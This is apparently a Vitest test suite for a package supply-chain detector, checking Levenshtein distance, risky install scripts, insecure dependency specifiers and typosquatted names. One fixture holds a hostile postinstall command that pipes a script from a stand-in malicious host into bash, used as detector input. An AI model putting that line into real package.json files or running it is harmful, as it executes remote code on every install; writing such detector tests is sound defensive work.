import { describe, expect, it } from "vitest";
import { checkPackageSupplyChain, levenshteinDistance } from "../src/detectors/packages.js";
import { checkPackages } from "../src/checks/packages.js";

describe("Deep Supply-Chain Analysis Suite", () => {
  it("calculates accurate Levenshtein distance", () => {
    expect(levenshteinDistance("lodash", "lodas")).toBe(1);
    expect(levenshteinDistance("react", "reavt")).toBe(1);
    expect(levenshteinDistance("express", "express")).toBe(0);
    expect(levenshteinDistance("", "abc")).toBe(3);
  });

  it("detects dangerous install scripts in package.json", () => {
    const pkg = {
      name: "risky-pkg",
      scripts: {
        postinstall: "curl https://malicious.site/script.sh | bash",
      },
    };

    const result = checkPackageSupplyChain(pkg);
    expect(result.installScriptRisks.length).toBe(1);
    expect(result.installScriptRisks[0]!.scriptName).toBe("postinstall");
    expect(result.installScriptRisks[0]!.command).toContain("curl");

    const diags = checkPackages(result);
    const scriptDiag = diags.find((d) => d.id === "packages.install-script:postinstall");
    expect(scriptDiag).toBeDefined();
    expect(scriptDiag?.severity).toBe("critical");
  });

  it("detects unencrypted HTTP dependencies and unpinned git dependencies", () => {
    const pkg = {
      name: "insecure-deps-pkg",
      dependencies: {
        "legacy-lib": "http://insecure-host.org/lib.tar.gz",
        "custom-tool": "git+https://github.com/org/tool.git",
        "wildcard-dep": "*",
      },
    };

    const result = checkPackageSupplyChain(pkg);
    expect(result.insecureDependencies.length).toBe(3);

    const httpDep = result.insecureDependencies.find((d) => d.name === "legacy-lib");
    expect(httpDep?.type).toBe("http-url");

    const gitDep = result.insecureDependencies.find((d) => d.name === "custom-tool");
    expect(gitDep?.type).toBe("unpinned-git");

    const wildcardDep = result.insecureDependencies.find((d) => d.name === "wildcard-dep");
    expect(wildcardDep?.type).toBe("wildcard-version");

    const diags = checkPackages(result);
    expect(diags.some((d) => d.id === "packages.insecure-dependency:legacy-lib" && d.severity === "critical")).toBe(true);
    expect(diags.some((d) => d.id === "packages.insecure-dependency:custom-tool" && d.severity === "warning")).toBe(true);
    expect(diags.some((d) => d.id === "packages.insecure-dependency:wildcard-dep" && d.severity === "warning")).toBe(true);
  });

  it("detects typosquatting using Levenshtein distance against popular packages", () => {
    const pkg = {
      name: "typo-test",
      dependencies: {
        lodas: "^4.17.21", // 1 char distance from lodash
        reavt: "18.2.0",   // 1 char distance from react
      },
    };

    const result = checkPackageSupplyChain(pkg);
    expect(result.typosquats.length).toBe(2);

    const lodashTypo = result.typosquats.find((t) => t.name === "lodas");
    expect(lodashTypo?.targetPackage).toBe("lodash");

    const reactTypo = result.typosquats.find((t) => t.name === "reavt");
    expect(reactTypo?.targetPackage).toBe("react");

    const diags = checkPackages(result);
    expect(diags.some((d) => d.id === "packages.typosquat:lodas" && d.severity === "critical")).toBe(true);
  });
});
